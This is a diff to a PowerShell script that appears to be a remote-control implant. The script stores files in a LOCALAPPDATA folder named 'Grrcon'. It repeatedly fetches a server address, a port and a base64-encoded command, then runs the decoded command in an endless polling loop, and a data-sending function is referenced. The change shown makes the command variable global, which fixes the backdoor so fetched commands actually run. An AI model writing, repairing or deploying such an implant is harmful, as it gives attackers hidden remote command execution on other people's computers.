@@ -1,4 +1,5 @@
 $wp = $env:LOCALAPPDATA + "\Grrcon\"
+
 if (!(Test-Path $wp)) {
         New-Item -ItemType Directory -Force -Path $wp
 }
@@ -8,7 +9,7 @@ function query(){
     $results = $query.strings -split ","
     $address = $results[0]
     $port = $results[1]
-    $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
+    $Global:cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
 }
 function runcommand(){
     if ($cmd.StartsWith("EXEC=")){
@@ -37,7 +38,7 @@ function sendData($datatosend) {
 While ($True){
     Start-Sleep -s 5
     query
+    $cmd
     Start-Sleep -s 1
     runcommand
 }
-
